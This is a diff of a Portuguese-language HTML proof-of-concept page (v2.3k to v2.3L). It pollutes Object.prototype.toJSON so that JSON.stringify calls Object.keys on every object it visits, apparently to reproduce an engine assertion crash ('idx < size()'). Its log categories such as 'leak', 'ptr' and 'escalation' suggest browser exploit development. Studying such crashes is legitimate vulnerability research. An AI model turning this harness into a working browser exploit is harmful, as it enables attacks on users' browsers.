@@ -2,15 +2,12 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PoC Isolado v2.3k - Teste 'this' Específico</title>
+    <title>PoC Isolado v2.3L - Object.keys em Todos 'this'</title>
     <style> /* ... estilos como antes ... */ </style>
 </head>
 <body>
-    <h1>PoC Isolado v2.3k - Testando 'this' Específico com Object.keys</h1>
-    <p>Botões para testar JSON.stringify em diferentes objetos.</p>
-    <button onclick="runTest('root')">Testar com Objeto Raiz Sendo o Alvo</button><br>
-    <button onclick="runTest('nested')">Testar com Objeto Aninhado Sendo o Alvo</button><br>
-    <button onclick="runTest('simple_no_target')">Testar com Objeto Simples (Sem Alvo Específico no toJSON)</button><br>
+    <h1>PoC Isolado v2.3L - Object.keys em Todos 'this' com Identificação</h1>
+    <button onclick="runTest_v23L()">Iniciar Teste v2.3L</button>
     <div id="output"></div>
 
     <script>
@@ -20,16 +17,15 @@
 
         const outputDivS1 = document.getElementById('output');
         const MEDIUM_PAUSE_S1 = 200;
-        let callCount_toJSON_k = 0;
-        let targetThisForKeys = null; // Variável para definir qual 'this' deve acionar Object.keys
+        let callCount_toJSON_L = 0;
 
         const logS1 = (message, type = 'info', funcName = '') => {
             console.log(`[${type.toUpperCase()}] ${funcName ? '['+funcName+'] ' : ''}${message}`);
+            // ... (lógica de logS1 para div como antes) ...
             const targetDiv = document.getElementById('output');
             if (targetDiv) {
                 try {
                     const timestamp = `[${new Date().toLocaleTimeString()}]`;
-                    // ... (resto da lógica de logS1)
                     const prefix = funcName ? `[${funcName}] ` : '';
                     const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;");
                     const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info';
@@ -41,104 +37,82 @@
         };
         const PAUSE_S1_FUNC = (ms = 50) => new Promise(r => setTimeout(r, ms));
 
-        // Objetos de Teste
-        const rootObject_k = { a: 1, b: 'test_data_k', c: { nested_k: true, d: "deep_val_k" } };
-        const nestedObject_k = rootObject_k.c; // Referência direta ao objeto aninhado
-        const simpleObject_k = { only_one_level: "ok" };
+        const testObject_L = { a: 10, b: 'data_L', c: { nested_L: true, d_L: "deep_L" } };
 
-        let originalToJSON_Descriptor_k; // Manter fora para restaurar corretamente
-        let ppKey = 'toJSON';
+        let originalToJSON_Descriptor_L;
+        const ppKey_L = 'toJSON';
 
-        function setupPrototypePollution(testTarget) {
-            callCount_toJSON_k = 0;
-            targetThisForKeys = null; // Reseta o alvo
+        function setupPrototypePollution_L() {
+            callCount_toJSON_L = 0;
+            originalToJSON_Descriptor_L = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_L);
 
-            if (testTarget === 'root') {
-                targetThisForKeys = rootObject_k;
-                logS1("Configurado para acionar Object.keys quando 'this' for rootObject_k", 'warn', 'setup');
-            } else if (testTarget === 'nested') {
-                targetThisForKeys = nestedObject_k;
-                logS1("Configurado para acionar Object.keys quando 'this' for nestedObject_k", 'warn', 'setup');
-            } else {
-                logS1("Nenhum 'this' específico alvo para Object.keys. O toJSON sempre retornará uma string simples.", 'info', 'setup');
-            }
+            Object.prototype[ppKey_L] = function() {
+                callCount_toJSON_L++;
+                let logPrefix = `toJSON PoC v2.3L (Call ${callCount_toJSON_L})`;
+                
+                let thisIdentifier = "unknown_this";
+                if (this === testObject_L) thisIdentifier = "ROOT_OBJECT";
+                else if (this === testObject_L.c) thisIdentifier = "NESTED_OBJECT_C";
+                // Se o 'this' for o array de chaves de uma chamada anterior, a identificação será mais difícil aqui
+                // apenas pelo construtor, mas o log do construtor ainda ajuda.
+                else if (Array.isArray(this)) thisIdentifier = "ARRAY_OBJECT";
 
-            originalToJSON_Descriptor_k = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
 
-            Object.prototype[ppKey] = function() {
-                callCount_toJSON_k++;
-                let logPrefix = `toJSON PoC v2.3k (Chamada ${callCount_toJSON_k})`;
-                console.log(`%c${logPrefix} - Invocado! typeof this: ${typeof this}, constructor: ${this && this.constructor ? this.constructor.name : 'N/A'}`, "color:blue");
+                console.log(`%c${logPrefix} - Invocado! this_id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, "color:purple");
+                logS1(`${logPrefix} - Invocado! this_id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, 'critical', 'toJSON_L');
 
-                if (targetThisForKeys !== null && this === targetThisForKeys) {
-                    console.log(`%c${logPrefix} - 'this' É O ALVO! Tentando Object.keys(this)...`, "color:red; font-weight:bold;");
-                    logS1(`${logPrefix} - 'this' É O ALVO! Tentando Object.keys(this)...`, 'critical', 'toJSON');
-                    try {
-                        const keys = Object.keys(this);
-                        console.log(`%c${logPrefix} - Object.keys(this) SUCESSO. Chaves:`, "color:green", keys);
-                        logS1(`${logPrefix} - Object.keys(this) SUCESSO. Chaves: [${keys.join(',')}]`, 'good', 'toJSON');
-                        // Este é o retorno que suspeitamos causar o crash idx < size()
-                        return { "attempting_crash_with_keys": true, "object_keys_k": keys };
-                    } catch (e) {
-                        console.error(`${logPrefix} - ERRO em Object.keys(this) para o 'this' ALVO:`, e);
-                        logS1(`${logPrefix} - ERRO em Object.keys(this) para o 'this' ALVO: ${e.message}`, 'error', 'toJSON');
-                        return { "error_on_target_this": true, "message": String(e.message) };
-                    }
-                } else {
-                    // Para todos os outros 'this' ou se não houver alvo, retorna uma string simples para evitar recursão profunda
-                    // e para isolar o comportamento.
-                    console.log(`%c${logPrefix} - 'this' não é o alvo ou não há alvo. Retornando string simples.`, "color:orange");
-                    logS1(`${logPrefix} - 'this' não é o alvo ou não há alvo. Retornando string simples.`, 'info', 'toJSON');
-                    return "processed_non_target_this"; 
+                // Tentar console.dir(this) pode ser pesado, mas útil se o log acima não for suficiente
+                // console.dir(this);
+
+                let keys = [];
+                try {
+                    console.log(`%c${logPrefix} - Tentando Object.keys(this) para this_id='${thisIdentifier}'...`, "color:red; font-weight:bold;");
+                    keys = Object.keys(this); // A LINHA CRÍTICA
+                    console.log(`%c${logPrefix} - Object.keys(this) SUCESSO para this_id='${thisIdentifier}'. Chaves:`, "color:green", keys);
+                    logS1(`${logPrefix} - Object.keys(this) SUCESSO para this_id='${thisIdentifier}'. Chaves: [${keys.join(',')}]`, 'good', 'toJSON_L');
+                    return { "keys_from_this_id": thisIdentifier, "object_actual_keys": keys };
+                } catch (e) {
+                    console.error(`${logPrefix} - ERRO em Object.keys(this) para this_id='${thisIdentifier}':`, e);
+                    logS1(`${logPrefix} - ERRO em Object.keys(this) para this_id='${thisIdentifier}': ${e.message}`, 'error', 'toJSON_L');
+                    return { "error_getting_keys_for_this_id": thisIdentifier, "message": String(e.message) };
                 }
             };
-            logS1("Poluição Object.prototype.toJSON APLICADA com lógica condicional.", 'good', 'setup');
+            logS1("Poluição Object.prototype.toJSON APLICADA (sempre tenta Object.keys).", 'good', 'setup_L');
         }
 
-        function cleanupPrototypePollution() {
-            if (originalToJSON_Descriptor_k) {
-                Object.defineProperty(Object.prototype, ppKey, originalToJSON_Descriptor_k);
-            } else if (Object.prototype.hasOwnProperty(ppKey)) {
-                delete Object.prototype[ppKey];
+        function cleanupPrototypePollution_L() {
+            if (originalToJSON_Descriptor_L) {
+                Object.defineProperty(Object.prototype, ppKey_L, originalToJSON_Descriptor_L);
+            } else if (Object.prototype.hasOwnProperty(ppKey_L)) {
+                delete Object.prototype[ppKey_L];
             }
-            logS1("Object.prototype.toJSON restaurado.", 'good', 'cleanup');
-            originalToJSON_Descriptor_k = undefined; // Garante que está limpo para a próxima execução
-            targetThisForKeys = null;
+            logS1("Object.prototype.toJSON restaurado.", 'good', 'cleanup_L');
         }
 
-        async function runTest(testType) {
-            const buttons = document.querySelectorAll('button');
-            buttons.forEach(b => b.disabled = true);
-            
+        async function runTest_v23L() {
+            document.querySelectorAll('button').forEach(b => b.disabled = true);
             if (outputDivS1) outputDivS1.innerHTML = '';
-            logS1(`==== INICIANDO PoC Isolado v2.3k (Teste Tipo: ${testType}) ====`, 'test', 'runTest');
+            logS1(`==== INICIANDO PoC Isolado v2.3L (Object.keys em Todos 'this') ====`, 'test', 'runTest_L');
 
-            setupPrototypePollution(testType); // Configura o alvo para Object.keys
-
-            let objectToTest;
-            if (testType === 'root' || testType === 'nested') {
-                objectToTest = rootObject_k; // Sempre stringify o objeto raiz para testar a recursão
-            } else { // simple_no_target
-                objectToTest = simpleObject_k;
-            }
+            setupPrototypePollution_L();
             
-            logS1(`Tentando JSON.stringify em: ${JSON.stringify(objectToTest).substring(0,50)}...`, 'critical', 'runTest');
-            let result_k;
+            logS1(`Tentando JSON.stringify em testObject_L...`, 'critical', 'runTest_L');
+            let result_L;
             try {
-                await PAUSE_S1_FUNC(50); // Pausa para logs aparecerem
-                result_k = JSON.stringify(objectToTest);
-                logS1(`JSON.stringify CONCLUÍDO. Resultado (parcial): ${result_k ? String(result_k).substring(0, 300) : "N/A"}`, 'good', 'runTest');
+                await PAUSE_S1_FUNC(50); 
+                result_L = JSON.stringify(testObject_L);
+                logS1(`JSON.stringify CONCLUÍDO. Resultado (parcial): ${result_L ? String(result_L).substring(0, 1000) : "N/A"}`, 'good', 'runTest_L');
             } catch (e) {
-                logS1(`ERRO CAPTURADO por JSON.stringify: ${e.message}`, 'error', 'runTest');
-                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', 'runTest');
-                console.error("ERRO durante JSON.stringify em runTest:", e);
+                logS1(`ERRO CAPTURADO por JSON.stringify: ${e.message}`, 'error', 'runTest_L');
+                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', 'runTest_L');
+                console.error("ERRO durante JSON.stringify em runTest_L:", e);
             } finally {
-                cleanupPrototypePollution();
+                cleanupPrototypePollution_L();
             }
             
             await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
-            logS1(`\n==== PoC Isolado v2.3k (Teste Tipo: ${testType}) CONCLUÍDO ====`, 'test', 'runTest');
-            buttons.forEach(b => b.disabled = false);
+            logS1(`\n==== PoC Isolado v2.3L CONCLUÍDO ====`, 'test', 'runTest_L');
+            document.querySelectorAll('button').forEach(b => b.disabled = false);
         }
     </script>
 </body>
